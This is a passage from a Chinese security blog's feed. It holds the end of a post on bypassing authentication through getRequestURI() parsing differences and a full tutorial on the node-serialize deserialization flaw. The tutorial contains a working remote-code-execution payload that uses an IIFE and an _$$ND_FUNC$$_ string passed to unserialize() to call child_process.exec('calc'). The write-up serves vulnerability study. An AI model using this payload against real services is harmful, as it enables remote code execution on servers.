alt=""></p><p>整个的过程大致如此，就是利用解析的差异性来绕过认证。</p><p>在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">getRequestURI()带来的安全问题</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://www.mi1k7ea.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>node-serialize反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/node-serialize反序列化漏洞/</id>
    <published>2020-03-29T15:05:59.000Z</published>
    <updated>2020-03-29T16:02:10.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>需要安装node-serialize模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure><h2 id="0x03-序列化"><a href="#0x03-序列化" class="headerlink" title="0x03 序列化"></a>0x03 序列化</h2><p>序列化代码如下，serialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p>变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;node serialize.js</span><br><span class="line">Serialized:</span><br><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-IIFE"><a href="#0x04-IIFE" class="headerlink" title="0x04 IIFE"></a>0x04 IIFE</h2><p>前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。</p><p>IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。</p><p>IIFE一般有如下两种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code /* &#125;());</span><br><span class="line">(function()&#123; /* code /* &#125;)();</span><br></pre></td></tr></table></figure><p>有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。</p><p>写下Demo试下，下面两种形式都能成功弹计算器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/1.png" alt=""></p><p>在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">poc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/2.png" alt=""></p><h2 id="0x05-反序列化触发RCE"><a href="#0x05-反序列化触发RCE" class="headerlink" title="0x05 反序列化触发RCE"></a>0x05 反序列化触发RCE</h2><p>前面序列化得到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加<code>()</code>来构造即可（为啥能这么构造后面会说到）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下，unserialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"function":"_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()"&#125;'</span></span><br><span class="line"></span><br><span class="line">s.unserialize(payload);</span><br></pre></td></tr></table></figure><p>运行即可触发RCE弹计算器：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/3.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>我们看源码，位于NodeJS\node_modules\node-serialize\lib\serialize.js，其中反序列化相关的代码如下：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/4.png" alt=""></p><p>这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即<code>_$$ND_FUNC$$_</code>，在前面的代码中有定义，该值表明其中的内容是个函数：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p><p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p><p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p><p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
</feed>
